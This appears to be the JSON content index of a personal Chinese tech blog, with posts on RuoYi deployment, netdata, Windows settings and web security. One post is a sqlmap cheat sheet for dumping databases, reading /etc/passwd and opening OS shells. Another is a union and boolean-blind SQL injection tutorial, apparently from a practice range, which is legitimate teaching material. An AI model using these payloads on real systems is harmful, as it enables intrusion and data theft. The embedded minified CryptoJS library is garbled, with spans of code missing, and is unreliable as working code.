{"meta":{"title":"FlyTeng","subtitle":"个人博客","description":"这是我个人搭建的一个博客","author":"FlyTeng","url":"https://bestflyteng.github.io","root":"/"},"pages":[{"title":"分类","date":"2024-08-16T07:59:09.000Z","updated":"2024-11-26T06:31:54.000Z","comments":true,"path":"categories/index.html","permalink":"https://bestflyteng.github.io/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2024-08-16T07:51:58.000Z","updated":"2024-11-25T08:34:16.000Z","comments":true,"path":"friends/index.html","permalink":"https://bestflyteng.github.io/friends/index.html","excerpt":"","text":""},{"title":"反馈和建议","date":"2025-06-08T04:28:00.000Z","updated":"2025-06-08T04:28:16.000Z","comments":true,"path":"feedback/index.html","permalink":"https://bestflyteng.github.io/feedback/index.html","excerpt":"","text":""},{"title":"","date":"2025-10-16T06:02:22.749Z","updated":"2024-11-27T04:45:56.000Z","comments":true,"path":"gallery/index.html","permalink":"https://bestflyteng.github.io/gallery/index.html","excerpt":"","text":"壁紙 收藏的一些壁紙"},{"title":"","date":"2025-10-16T06:02:22.750Z","updated":"2025-06-08T09:00:02.000Z","comments":true,"path":"music/index.html","permalink":"https://bestflyteng.github.io/music/index.html","excerpt":"","text":"var options = {\"narrow\":false,\"autoplay\":true,\"showlrc\":3,\"mode\":\"random\",\"mutex\":true,\"theme\":\"#e6d0b2\",\"preload\":\"metadata\",\"listmaxheight\":\"513px\",\"music\":[{\"title\":\"可能否\",\"author\":\"木小雅\",\"url\":\"/assets/music/木小雅 - 可能否/木小雅 - 可能否.mp3\",\"pic\":\"/assets/music/木小雅 - 可能否/picture.png\",\"lrc\":\"/assets/music/木小雅 - 可能否/lyrics.lrc\"},{\"title\":\"后来\",\"author\":\"刘若英\",\"url\":\"/assets/music/刘若英 - 后来/刘若英 - 后来.mp3\",\"pic\":\"/assets/music/刘若英 - 后来/picture.png\",\"lrc\":\"/assets/music/刘若英 - 后来/lyrics.lrc\"},{\"title\":\"最后一页\",\"author\":\"江语晨\",\"url\":\"/assets/music/江语晨 - 最后一页/江语晨 - 最后一页.mp3\",\"pic\":\"/assets/music/江语晨 - 最后一页/picture.png\",\"lrc\":\"/assets/music/江语晨 - 最后一页/lyrics.lrc\"},{\"title\":\"The Truth That You Leave\",\"author\":\"Pianoboy高至豪\",\"url\":\"/assets/music/Pianoboy高至豪 - The Truth That You Leave/Pianoboy高至豪 - The Truth That You Leave.mp3\",\"pic\":\"/assets/music/Pianoboy高至豪 - The Truth That You Leave/picture.png\",\"lrc\":\"/assets/music/Pianoboy高至豪 - The Truth That You Leave/lyrics.lrc\"},{\"title\":\"乖\",\"author\":\"Ssweetxin_\",\"url\":\"/assets/music/Ssweetxin_ - 乖/Ssweetxin_ - 乖.mp3\",\"pic\":\"/assets/music/Ssweetxin_ - 乖/picture.png\",\"lrc\":\"/assets/music/Ssweetxin_ - 乖/lyrics.lrc\"},{\"title\":\"万年星光\",\"author\":\"Lorien\",\"url\":\"/assets/music/Lorien - 万年星光/Lorien - 万年星光.mp3\",\"pic\":\"/assets/music/Lorien - 万年星光/picture.png\",\"lrc\":\"/assets/music/Lorien - 万年星光/lyrics.lrc\"},{\"title\":\"爱丫爱丫\",\"author\":\"BY2\",\"url\":\"/assets/music/BY2 - 爱丫爱丫/BY2 - 爱丫爱丫.mp3\",\"pic\":\"/assets/music/BY2 - 爱丫爱丫/picture.png\",\"lrc\":\"/assets/music/BY2 - 爱丫爱丫/lyrics.lrc\"},{\"title\":\"明天过后\",\"author\":\"张杰\",\"url\":\"/assets/music/张杰 - 明天过后/张杰 - 明天过后.mp3\",\"pic\":\"/assets/music/张杰 - 明天过后/picture.png\",\"lrc\":\"/assets/music/张杰 - 明天过后/lyrics.lrc\"}]}; options.element = document.getElementById(\"aplayer-lwwYDoID\"); var ap = new APlayer(options); window.aplayers || (window.aplayers = []); window.aplayers.push(ap);"},{"title":"说说","date":"2018-06-07T14:17:49.000Z","updated":"2024-11-25T10:17:36.000Z","comments":true,"path":"say/index.html","permalink":"https://bestflyteng.github.io/say/index.html","excerpt":"","text":""},{"title":"tags","date":"2024-08-16T07:51:58.000Z","updated":"2024-08-16T08:51:56.000Z","comments":true,"path":"tags/index.html","permalink":"https://bestflyteng.github.io/tags/index.html","excerpt":"","text":""},{"title":"","date":"2025-10-16T06:02:18.770Z","updated":"2024-11-25T11:57:56.000Z","comments":true,"path":"assets/friends/friends.json","permalink":"https://bestflyteng.github.io/assets/friends/friends.json","excerpt":"","text":"[{\"class_name\":\"\",\"class_desc\":\"\",\"link_list\":[{\"name\":\"油炸鱼头\",\"link\":\"https://youzhayutou.github.io/\",\"avatar\":\"/assets/friends/avatar/1.jpg\",\"descr\":\"这个人有点傻\"},{\"name\":\"泰极\",\"link\":\"https://taichiyly.github.io/\",\"avatar\":\"/assets/friends/avatar/2.jpg\",\"descr\":\"这个人会武术\"}]}]"},{"title":"","date":"2025-10-16T06:02:19.143Z","updated":"2025-06-14T10:22:22.000Z","comments":true,"path":"assets/js/crypto.js","permalink":"https://bestflyteng.github.io/assets/js/crypto.js","excerpt":"","text":"!function(t,e){\"object\"==typeof exports?module.exports=exports=e():\"function\"==typeof define&&define.amd?define([],e):t.CryptoJS=e()}(this,function(){var n,o,s,a,h,t,e,l,r,i,c,f,d,u,p,S,x,b,A,H,z,_,v,g,y,B,w,k,m,C,D,E,R,M,F,P,W,O,I,U=U||function(h){var i;if(\"undefined\"!=typeof window&&window.crypto&&(i=window.crypto),\"undefined\"!=typeof self&&self.crypto&&(i=self.crypto),!(i=!(i=!(i=\"undefined\"!=typeof globalThis&&globalThis.crypto?globalThis.crypto:i)&&\"undefined\"!=typeof window&&window.msCrypto?window.msCrypto:i)&&\"undefined\"!=typeof global&&global.crypto?global.crypto:i)&&\"function\"==typeof require)try{i=require(\"crypto\")}catch(t){}var r=Object.create||function(t){return e.prototype=t,t=new e,e.prototype=null,t};function e(){}var t={},n=t.lib={},o=n.Base={extend:function(t){var e=r(this);return t&&e.mixIn(t),e.hasOwnProperty(\"init\")&&this.init!==e.init||(e.init=function(){e.$super.init.apply(this,arguments)}),(e.init.prototype=e).$super=this,e},create:function(){var t=this.extend();return t.init.apply(t,arguments),t},init:function(){},mixIn:function(t){for(var e in t)t.hasOwnProperty(e)&&(this[e]=t[e]);t.hasOwnProperty(\"toString\")&&(this.toString=t.toString)},clone:function(){return this.init.prototype.extend(this)}},l=n.WordArray=o.extend({init:function(t,e){t=this.words=t||[],this.sigBytes=null!=e?e:4*t.length},toString:function(t){return(t||c).stringify(this)},concat:function(t){var e=this.words,r=t.words,i=this.sigBytes,n=t.sigBytes;if(this.clamp(),i%4)for(var o=0;o>>2]>>>24-o%4*8&255;e[i+o>>>2]|=s2]=r[c>>>2];return this.sigBytes+=n,this},clamp:function(){var t=this.words,e=this.sigBytes;t[e>>>2]&=4294967295>>24-n%4*8&255;i.push((o>>>4).toString(16)),i.push((15&o).toString(16))}return i.join(\"\")},parse:function(t){for(var e=t.length,r=[],i=0;i>>3]|=parseInt(t.substr(i,2),16)2]>>>24-n%4*8&255;i.push(String.fromCharCode(o))}return i.join(\"\")},parse:function(t){for(var e=t.length,r=[],i=0;i>>2]|=(255&t.charCodeAt(i))>8&255,i=255&t,255===(e=t>>16&255)?(e=0,255===r?(r=0,255===i?i=0:++i):++r):++e,t=0,t+=e>0>>0?1:0)|0,e[3]=e[3]+1295307597+(e[2]>>>0>>0?1:0)|0,e[4]=e[4]+3545052371+(e[3]>>>0>>0?1:0)|0,e[5]=e[5]+886263092+(e[4]>>>0>>0?1:0)|0,e[6]=e[6]+1295307597+(e[5]>>>0>>0?1:0)|0,e[7]=e[7]+3545052371+(e[6]>>>0>>0?1:0)|0,this._b=e[7]>>>0>>0?1:0;for(r=0;r>>16;R[r]=((n*n>>>17)+n*o>>>15)+o*o^((4294901760&i)*i|0)+((65535&i)*i|0)}t[0]=R[0]+(R[7]>16)+(R[6]>16)|0,t[1]=R[1]+(R[0]>24)+R[7]|0,t[2]=R[2]+(R[1]>16)+(R[0]>16)|0,t[3]=R[3]+(R[2]>24)+R[1]|0,t[4]=R[4]+(R[3]>16)+(R[2]>16)|0,t[5]=R[5]+(R[4]>24)+R[3]|0,t[6]=R[6]+(R[5]>16)+(R[4]>16)|0,t[7]=R[7]+(R[6]>24)+R[5]|0}function q(){for(var t=this._X,e=this._C,r=0;r>>0>>0?1:0)|0,e[2]=e[2]+886263092+(e[1]>>>0>>0?1:0)|0,e[3]=e[3]+1295307597+(e[2]>>>0>>0?1:0)|0,e[4]=e[4]+3545052371+(e[3]>>>0>>0?1:0)|0,e[5]=e[5]+886263092+(e[4]>>>0>>0?1:0)|0,e[6]=e[6]+1295307597+(e[5]>>>0>>0?1:0)|0,e[7]=e[7]+3545052371+(e[6]>>>0>>0?1:0)|0,this._b=e[7]>>>0>>0?1:0;for(r=0;r>>16;I[r]=((n*n>>>17)+n*o>>>15)+o*o^((4294901760&i)*i|0)+((65535&i)*i|0)}t[0]=I[0]+(I[7]>16)+(I[6]>16)|0,t[1]=I[1]+(I[0]>24)+I[7]|0,t[2]=I[2]+(I[1]>16)+(I[0]>16)|0,t[3]=I[3]+(I[2]>24)+I[1]|0,t[4]=I[4]+(I[3]>16)+(I[2]>16)|0,t[5]=I[5]+(I[4]>24)+I[3]|0,t[6]=I[6]+(I[5]>16)+(I[4]>16)|0,t[7]=I[7]+(I[6]>24)+I[5]|0}return F=(M=U).lib,n=F.Base,o=F.WordArray,(M=M.x64={}).Word=n.extend({init:function(t,e){this.high=t,this.low=e}}),M.WordArray=n.extend({init:function(t,e){t=this.words=t||[],this.sigBytes=null!=e?e:8*t.length},toX32:function(){for(var t=this.words,e=t.length,r=[],i=0;i2]|=t[i]2]>>>16-n%4*8&65535;i.push(String.fromCharCode(o))}return i.join(\"\")},parse:function(t){for(var e=t.length,r=[],i=0;i>>1]|=t.charCodeAt(i)>2]>>>16-n%4*8&65535);i.push(String.fromCharCode(o))}return i.join(\"\")},parse:function(t){for(var e=t.length,r=[],i=0;i>>1]|=s(t.charCodeAt(i)2]>>>24-o%4*8&255)>2]>>>24-(o+1)%4*8&255)>2]>>>24-(o+2)%4*8&255,c=0;c>6*(3-c)&63));var a=i.charAt(64);if(a)for(;n.length%4;)n.push(a);return n.join(\"\")},parse:function(t){var e=t.length,r=this._map;if(!(i=this._reverseMap))for(var i=this._reverseMap=[],n=0;n>>2]|=c2]>>>24-s%4*8&255)>2]>>>24-(s+1)%4*8&255)>2]>>>24-(s+2)%4*8&255,a=0;a>6*(3-a)&63));var h=n.charAt(64);if(h)for(;o.length%4;)o.push(h);return o.join(\"\")},parse:function(t,e=!0){var r=t.length,i=e?this._safe_map:this._map;if(!(n=this._reverseMap))for(var n=this._reverseMap=[],o=0;o>>2]|=c>5]|=128>98),e[14+(64+i>>>98),t.sigBytes=4*(e.length+1),this._process();for(var e=this._hash,o=e.words,s=0;s24)|4278255360&(c>8)}return e},clone:function(){var t=i.clone.call(this);return t._hash=this._hash.clone(),t}});function H(t,e,r,i,n,o,s){s=t+(e&r|~e&i)+n+s;return(s>32-o)+e}function z(t,e,r,i,n,o,s){s=t+(e&i|r&~i)+n+s;return(s>32-o)+e}function C(t,e,r,i,n,o,s){s=t+(e^r^i)+n+s;return(s>32-o)+e}function D(t,e,r,i,n,o,s){s=t+(r^(e|~i))+n+s;return(s>32-o)+e}t.MD5=i._createHelper(e),t.HmacMD5=i._createHmacHelper(e)}(Math),P=(M=U).lib,t=P.WordArray,e=P.Hasher,P=M.algo,l=[],P=P.SHA1=e.extend({_doReset:function(){this._hash=new t.init([1732584193,4023233417,2562383102,271733878,3285377520])},_doProcessBlock:function(t,e){for(var r=this._hash.words,i=r[0],n=r[1],o=r[2],s=r[3],c=r[4],a=0;a27)+c+l[a];h+=a>5]|=128>9>919)^u>>>10)+_[f-16]);var d=i&n^i&o^n&o,u=l+((c>6)^(c>11)^(c>25))+(c&a^~c&h)+p[f]+_[f],l=h,h=a,a=c,c=s+u|0,s=o,o=n,n=i,i=u+(((i>2)^(i>13)^(i>22))+d)|0}r[0]=r[0]+i|0,r[1]=r[1]+n|0,r[2]=r[2]+o|0,r[3]=r[3]+s|0,r[4]=r[4]+c|0,r[5]=r[5]+a|0,r[6]=r[6]+h|0,r[7]=r[7]+l|0},_doFinalize:function(){var t=this._data,e=t.words,r=8*this._nDataBytes,i=8*t.sigBytes;return e[i>>>5]|=128>9>97)+Z+((j=(Z=(J>>>1|$>8|$>7|$>0>>0?1:0))+((G>>>19|V>>6)+((j+=J=(V>>>19|G>>6|G>0>>0?1:0),j+=$=Q.low,N.high=T=T+Y+(j>>>0>>0?1:0),N.low=j);var q=F&W^~F&I,Z=P&O^~P&U,V=A&z^A&D^z&D,G=(H>>>28|A7),J=t1[L],Q=J.high,Y=J.low,$=X+((P>>>14|F>18|F>>14|P>18|P>>0>>0?1:0),J=G+(H&C^H&E^C&E),K=I,X=U,I=W,U=O,W=F,O=P,F=R+(N=(N=(N=N+q+(($=$+Z)>>>0>>0?1:0))+Q+(($=$+Y)>>>0>>0?1:0))+T+(($=$+j)>>>0>>0?1:0))+((P=M+$|0)>>>0>>0?1:0)|0,R=D,M=E,D=z,E=C,z=A,C=H,A=N+(((A>>>28|H7))+V+(J>>>0>>0?1:0))+((H=$+J|0)>>>0>>0?1:0)|0}d=i.low=d+H,i.high=f+A+(d>>>0>>0?1:0),p=n.low=p+C,n.high=u+z+(p>>>0>>0?1:0),y=o.low=y+E,o.high=_+D+(y>>>0>>0?1:0),g=s.low=g+M,s.high=v+R+(g>>>0>>0?1:0),w=c.low=w+P,c.high=B+F+(w>>>0>>0?1:0),m=a.low=m+O,a.high=k+W+(m>>>0>>0?1:0),x=h.low=x+U,h.high=S+I+(x>>>0>>0?1:0),r=l.low=r+X,l.high=b+K+(r>>>0>>0?1:0)},_doFinalize:function(){var t=this._data,e=t.words,r=8*this._nDataBytes,i=8*t.sigBytes;return e[i>>>5]|=128>10>10>>24]^n[d>>>16&255]^o[h>>>8&255]^s[255&l]^r[u++],g=i[d>>>24]^n[h>>>16&255]^o[l>>>8&255]^s[255&f]^r[u++],h=_,l=y,f=v,d=g;_=(c[h>>>24]>16&255]>8&255]>24]>16&255]>8&255]>24]>16&255]>8&255]>24]>16&255]>8&255]5]>>>31-i%32&1}for(var n=this._subKeys=[],o=0;o>t^this._rBlock)&e;this._rBlock^=e,this._lBlock^=e>t^this._lBlock)&e;this._lBlock^=e,this._rBlock^=e16],n=this._C=[t[2]>16,4294901760&t[0]|65535&t[1],t[3]>16,4294901760&t[1]|65535&t[2],t[0]>16,4294901760&t[2]|65535&t[3],t[1]>16,4294901760&t[3]|65535&t[0]],r=this._b=0;r8),o=16711935&(c>24)|4278255360&(c>8),s=e>>>16|4294901760&o,c=o16^r[3]>16^r[5]>16^r[7]>16^r[1]16,t[1],t[0]>16,t[2],t[1]>16,t[3],t[2]>16],i=this._C=[t[2]>16,4294901760&t[0]|65535&t[1],t[3]>16,4294901760&t[1]|65535&t[2],t[0]>16,4294901760&t[2]|65535&t[3],t[1]>16,4294901760&t[3]|65535&t[0]],n=this._b=0;n8),o=16711935&(t>24)|4278255360&(t>8),s=e>>>16|4294901760&o,t=o16^r[3]>16^r[5]>16^r[7]>16^r[1]"},{"title":"","date":"2025-10-16T06:02:22.747Z","updated":"2024-11-25T10:14:50.000Z","comments":true,"path":"assets/say/shuoshuo.json","permalink":"https://bestflyteng.github.io/assets/say/shuoshuo.json","excerpt":"","text":"[{\"author\":\"Butterfly\",\"avatar\":\"https://butterfly.js.org/img/avatar.png\",\"date\":\"2024-06-21 23:33:26\",\"content\":\"This is a sample content for **Author 1**.\",\"key\":\"key-1\",\"tags\":[\"tags1\",\"tags2\"]},{\"author\":\"Butterfly\",\"avatar\":\"https://butterfly.js.org/img/avatar.png\",\"date\":\"2024-06-20 23:33:26\",\"content\":\"This is a sample content for **Author 2**.\",\"key\":\"key-2\",\"tags\":[\"tag2\",\"tag3\"]},{\"author\":\"Butterfly\",\"avatar\":\"https://butterfly.js.org/img/avatar.png\",\"date\":\"2024-06-19 23:33:26\",\"content\":\"This is a sample content for **Author 3**.\"}]"},{"title":"","date":"2025-10-16T06:02:22.749Z","updated":"2025-06-08T09:22:54.000Z","comments":true,"path":"gallery/wallpaper/index.html","permalink":"https://bestflyteng.github.io/gallery/wallpaper/index.html","excerpt":"","text":"[{\"url\":\"https://ts1.cn.mm.bing.net/th/id/R-C.b04f424ffd69d11fa59c11b7a23ac46d?rik=YQsFx3qpjqKAhQ&riu=http%3a%2f%2fbbsfiles.vivo.com.cn%2fvivobbs%2fattachment%2fforum%2f201605%2f01%2f224937zii919i1kjo071ph.jpg&ehk=VjY7xHAW2q4YMaIVMoessU3hhwZ%2feicktIdyYa54UIA%3d&risl=&pid=ImgRaw&r=0\",\"alt\":\"\"},{\"url\":\"https://www.bizhigq.com/pc-img/2023-05/g3039.jpg\",\"alt\":\"\"},{\"url\":\"https://ts1.cn.mm.bing.net/th/id/R-C.148101c205857241d1666d8d55d09eda?rik=emNVnf9uHL79Fg&riu=http%3a%2f%2fclubimg.club.vmall.com%2fdata%2fattachment%2fforum%2f202004%2f21%2f232808a58jxcywkezumtpe.jpg&ehk=lioHPAdzEqJwA%2bFZznIyKDWb6mew5xjFF2JeGHyicvY%3d&risl=&pid=ImgRaw&r=0\",\"alt\":\"\"},{\"url\":\"https://ts1.cn.mm.bing.net/th/id/R-C.63d7b1736c1e4d350b8cb506da45cccd?rik=Qcusf3eCI9tXgg&riu=http%3a%2f%2fpcs4.clubstatic.lenovo.com.cn%2fdata%2fattachment%2fforum%2f201712%2f28%2f102821u3tbv6b3obb9qoqt.jpg&ehk=gwGsnWRs8tnGa0%2fkDsaZMJJ78q6DLsY3Z9nmTIMilHg%3d&risl=1&pid=ImgRaw&r=0\",\"alt\":\"\"},{\"url\":\"https://ts1.cn.mm.bing.net/th/id/R-C.765c10656bdb92ea1af463233beea47e?rik=Qxxdnyf1sNO5qw&riu=http%3a%2f%2fbbsfiles.vivo.com.cn%2fvivobbs%2fattachment%2fforum%2f201803%2f04%2f135814swn8jbb9iw3n8h2x.jpg&ehk=DfQM02uGyP8TYK6ccVTN4NcVQDgqKFn%2fxpVR%2fzgUto0%3d&risl=&pid=ImgRaw&r=0\",\"alt\":\"\"}]"}],"posts":[{"title":"sqlmap 注入","slug":"202508311500","date":"2025-08-31T07:01:15.000Z","updated":"2025-10-17T16:05:32.521Z","comments":true,"path":"posts/304b10ed/","permalink":"https://bestflyteng.github.io/posts/304b10ed/","excerpt":"","text":"基本检测 检测 GET 参数 1sqlmap -u &quot;http://target.com/page?param=value&quot; 检测 POST 参数 1sqlmap -u &quot;http://target.com/login&quot; --data=&quot;username=admin&amp;password=pass&quot; 只检测特定参数 1sqlmap -u &quot;http://target.com/page?id=1&amp;name=test&quot; -p id 添加会话 Cookie 1sqlmap -u &quot;http://target.com/protected&quot; --cookie=&quot;PHPSESSID=abc123&quot; 指定数据库类型 1sqlmap -u &quot;http://target.com&quot; --dbms=mysql 使用随机 User-Agent 1sqlmap -u &quot;http://target.com&quot; --random-agent 使用代理 1sqlmap -u &quot;http://target.com&quot; --proxy=&quot;http://127.0.0.1:8080&quot; 使用 tamper 脚本绕过防护 1sqlmap -u &quot;http://target.com&quot; --tamper=space2comment 风险级别和测试强度 –level 参数（测试级别） ​​Level 1​​：仅测试 GET 参数（默认） ​​Level 2​​：测试 GET 和 POST 参数 ​​Level 3​​：增加 HTTP Cookie 头测试 ​​Level 4​​：增加 HTTP User-Agent 和 Referer 头测试 ​​Level 5​​：测试所有 HTTP 头（包括 Host 头 ） –risk 参数（风险级别） ​​Risk 1​​：使用低风险 payload（如基于错误的注入） ​​Risk 2​​：增加基于时间的盲注和布尔盲注 ​​Risk 3​​：使用 OR-based 注入（可能修改数据） 1sqlmap -u &quot;http://target.com&quot; --level=5 --risk=3 检测数据库版本 1sqlmap -u &quot;http://target.com&quot; --banner 检测当前用户 1sqlmap -u &quot;http://target.com&quot; --current-user 获取所有数据库名称 1sqlmap -u &quot;http://target.com&quot; --dbs 获取当前数据库名称 1sqlmap -u &quot;http://target.com&quot; --current-db 获取指定数据库的所有表 1sqlmap -u &quot;http://target.com&quot; -D &lt;database_name&gt; --tables 获取当前数据库的所有表 1sqlmap -u &quot;http://target.com&quot; --tables 获取指定表的所有列 1sqlmap -u &quot;http://target.com&quot; -D &lt;database_name&gt; -T &lt;table_name&gt; --columns 提取整个表的数据 1sqlmap -u &quot;http://target.com&quot; -D &lt;database_name&gt; -T &lt;table_name&gt; --dump 提取特定列的数据 1sqlmap -u &quot;http://target.com&quot; -D &lt;database_name&gt; -T &lt;table_name&gt; -C &quot;username,password&quot; --dump 获取数据库用户列表 1sqlmap -u &quot;http://target.com&quot; --users 获取用户权限 1sqlmap -u &quot;http://target.com&quot; --privileges 获取操作系统信息 1sqlmap -u &quot;http://target.com&quot; --os-info 读取服务器文件（需要高权限） 1sqlmap -u &quot;http://target.com&quot; --file-read &quot;/etc/passwd&quot; 写入文件（需要高权限） 1sqlmap -u &quot;http://target.com&quot; --file-write &quot;local_file.txt&quot; --file-dest &quot;/remote/path/file.txt&quot; 执行操作系统命令 1sqlmap -u &quot;http://target.com&quot; --os-cmd &quot;id&quot; 获取交互式 shell 1sqlmap -u &quot;http://target.com&quot; --os-shell 提取所有数据库的所有数据 1sqlmap -u &quot;http://target.com&quot; --dump-all 使用多线程加速 1sqlmap -u &quot;http://target.com&quot; --threads=10 使用代理（如 Burp Suite） 1sqlmap -u &quot;http://target.com&quot; --proxy=&quot;http://127.0.0.1:8080&quot; 使用 tamper 脚本绕过 WAF 1sqlmap -u &quot;http://target.com&quot; --tamper=space2comment 保存会话以便后续使用 1sqlmap -u &quot;http://target.com&quot; --save 清除缓存 1sqlmap -u &quot;http://target.com&quot; --purge","categories":[],"tags":[{"name":"sqlmap","slug":"sqlmap","permalink":"https://bestflyteng.github.io/tags/sqlmap/"},{"name":"Web 安全","slug":"Web-安全","permalink":"https://bestflyteng.github.io/tags/Web-%E5%AE%89%E5%85%A8/"}]},{"title":"Win10 部署若依前端分离版","slug":"202508211503","date":"2025-08-21T07:04:04.000Z","updated":"2025-08-21T13:18:30.000Z","comments":true,"path":"posts/621e92f2/","permalink":"https://bestflyteng.github.io/posts/621e92f2/","excerpt":"","text":"环境部署 开发和生产都是此环境 12345JDK &gt;= 1.8 (推荐1.8版本)Mysql &gt;= 5.7.0 (推荐5.7版本)Redis &gt;= 3.0Maven &gt;= 3.0Node &gt;= 12 下载源码 建议用 git clone 来克隆项目。 1git clone https://gitee.com/y_project/RuoYi-Vue.git 网址：https://ruoyi.vip/ 个人习惯，可以不做 将ruoyi-ui移动到上一级目录，并将RuoYi-Vue修改为ruoyi-master 开发环境部署 后端配置和运行 前端配置和运行 生产环境部署 此处生产环境为Centos7 详细配置见若依文档https://doc.ruoyi.vip/","categories":[],"tags":[{"name":"RuoYi","slug":"RuoYi","permalink":"https://bestflyteng.github.io/tags/RuoYi/"},{"name":"若依管理系统","slug":"若依管理系统","permalink":"https://bestflyteng.github.io/tags/%E8%8B%A5%E4%BE%9D%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/"},{"name":"前端分离版","slug":"前端分离版","permalink":"https://bestflyteng.github.io/tags/%E5%89%8D%E7%AB%AF%E5%88%86%E7%A6%BB%E7%89%88/"}]},{"title":"Web安全 SQL注入","slug":"202508181950","date":"2025-08-18T11:48:32.000Z","updated":"2025-08-18T16:49:18.000Z","comments":true,"path":"posts/4fedeb6/","permalink":"https://bestflyteng.github.io/posts/4fedeb6/","excerpt":"","text":"只说步骤，以下均用http://localhost/index.php?id=1来注入。以MySQL为例。 实际情况请考虑转义字符。 用到的函数(根据实际情况使用) database()：返回当前所在库。 length(string)：返回字符串长度。 ascii(string)：返回字符的ASCII码(int)。 SUBSTR(string,int1,int2)：截取字符串，int1从1开始计数，是起始位置。int2为截至长度。 显错注入 检测是否存在SQL注入，下述情况即存在。 1234-- 有数据id=1 and 1=1 -- 无数据id=1 and 1=2 使用order by语句测试有多少字段，注意观察页面变化。这里假设有三个字段。 1id=1 order by 3 查看当前所在哪一个库，这里id=5是查不出来数据的，这是为了第一条数据是查出来的库名，后面select语句的1，3是为了占位，因为一共有三个字段。 1id=5 union select 1,database(),3 知道库名后(假设为user)，从系统表information_schema.tables查出user库下有哪些表。 1id=5 union select 1,table_name,3 from information_schema.tables where table_schema=&#x27;user&#x27; limit 0,10 布尔盲注 检测是否存在SQL注入，下述情况即存在。 1234-- 有数据id=1 and 1=1 -- 无数据id=1 and 1=2 猜测库名长度，这里猜出来是12 1id=1 and length(database())&lt;=12 一个字符一个字符的猜测库名(一般会写个脚本猜测，这里解释原理)，ASCII码从48-122包含数字，小写字母，大写字母和一些符号，这里猜测出来库名是 kanwolongxia 12345678-- 类似于这样，直到猜出来库名id=1 and ascii(substr(database(),1,1))&gt;=109id=1 and ascii(substr(database(),1,1))&gt;=103id=1 and ascii(substr(database(),1,1))&gt;=107id=1 and ascii(substr(database(),2,1))&gt;=97id=1 and ascii(substr(database(),3,1))&gt;=110id=1 and ascii(substr(database(),4,1))&gt;=119...... 猜解表的数量，这里有3个表 1id=1 and (select count(table_name) from information_schema.tables where table_schema=&#x27;kanwolongxia&#x27;)&gt;=3 猜解每个表的名字，第一个表是loflag，第二个表是news，第三个表是user 1id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;kanwolongxia&#x27; limit 0,1),1,1))&gt;=109 猜解表的数据，先看有几个字段，再猜解表字段是什么。 123456-- 查看表有几个字段id=1 and (select count(column_name) from information_schema.columns where table_schema=&#x27;kanwolongxia&#x27; and table_name=&#x27;loflag&#x27;)&gt;1-- 猜字段，loflag的第一个字段是Id，第二个字段是flagloid=1 and ascii(substr((select column_name from information_schema.columns where table_schema=&#x27;kanwolongxia&#x27; and table_name=&#x27;loflag&#x27; limit 0,1),1,1))&gt;=97-- 猜解flag，有五条数据，第一条是zKaQ-QQQid=1 and ascii(substr((select flaglo from loflag limit 0,1),1,1))&gt;=97 Head注入 尚未更新","categories":[],"tags":[{"name":"网络安全","slug":"网络安全","permalink":"https://bestflyteng.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"Web安全","slug":"Web安全","permalink":"https://bestflyteng.github.io/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://bestflyteng.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"Win10 修改默认文件资源管理器","slug":"202508172230","date":"2025-08-17T14:31:10.000Z","updated":"2025-08-17T14:40:30.000Z","comments":true,"path":"posts/ce14aeee/","permalink":"https://bestflyteng.github.io/posts/ce14aeee/","excerpt":"","text":"首先安装新的文件管理器，这里以Sigma file manager为例。 打开注册表 修改数值数据为Sigma file manager的路径 重启计算机即可","categories":[],"tags":[{"name":"Win10","slug":"Win10","permalink":"https://bestflyteng.github.io/tags/Win10/"},{"name":"文件管理器","slug":"文件管理器","permalink":"https://bestflyteng.github.io/tags/%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%99%A8/"},{"name":"注册表","slug":"注册表","permalink":"https://bestflyteng.github.io/tags/%E6%B3%A8%E5%86%8C%E8%A1%A8/"}]},{"title":"netdata","slug":"202508122202","date":"2025-08-12T14:02:53.000Z","updated":"2025-08-16T14:52:10.000Z","comments":true,"path":"posts/c3d71371/","permalink":"https://bestflyteng.github.io/posts/c3d71371/","excerpt":"","text":"概述 Netdata能够帮助用户实时监测系统的性能指标，提供丰富的可视化界面，使用户可以轻松查看各类指标，包括CPU使用率、内存占用、磁盘IO、网络流量等。 Netdata自身的资源占用非常低，并且非常快。 安装 1apt install netdata 配置 1234567891011vim /etc/netdata/netdata.conf[global] run as user = netdata # 这里为了方便用了root，生产环境下禁止用root用户 web files owner = root web files group = root # Netdata is not designed to be exposed to potentially hostile # networks. See https://github.com/netdata/netdata/issues/164 # 这里是为了让所有设备可以访问web页面，可以根据自己的需求来配置 bind socket to IP = 0.0.0.0 启动 12# 启动前记得放通19999端口service netdata start 停止 1service netdata stop 访问页面 至此部署成功","categories":[],"tags":[{"name":"netdata","slug":"netdata","permalink":"https://bestflyteng.github.io/tags/netdata/"},{"name":"系统监控","slug":"系统监控","permalink":"https://bestflyteng.github.io/tags/%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7/"},{"name":"Centos 7","slug":"Centos-7","permalink":"https://bestflyteng.github.io/tags/Centos-7/"}]},{"title":"Win10 部署若依微服务版本","slug":"202505091815","date":"2025-05-09T10:16:10.000Z","updated":"2025-08-21T12:23:44.000Z","comments":true,"path":"posts/5a3cd46b/","permalink":"https://bestflyteng.github.io/posts/5a3cd46b/","excerpt":"","text":"环境部署 开发和生产都是此环境 1234567JDK &gt;= 1.8 (推荐1.8版本)Mysql &gt;= 5.7.0 (推荐5.7版本)Redis &gt;= 3.0Maven &gt;= 3.0Node &gt;= 12nacos &gt;= 2.0.4 (ruoyi-cloud &lt; 3.0 需要下载nacos &gt;= 1.4.x版本)sentinel &gt;= 1.6.0 下载 下载的任何文件都建议放在不包含中文的目录下 下载项目 项目链接: https://gitee.com/y_project/RuoYi-Cloud 或使用git拉取 1git clone https://gitee.com/y_project/RuoYi-Cloud.git 下载 nacos 官方下载: https://nacos.io/download/nacos-server/ 下载 seata-server 官方下载: https://nacos.io/download/nacos-server/ 下载 redis 这里用的是7.4.2版本 官方下载: https://redis.io/downloads/ 下载 MySQL,Nginx 这里用的是小皮面板，可以集成 Nginx,MySQL,FTP等服务,这里只用到了MySQL和Nginx 官方下载: https://www.xp.cn/php-study 下载 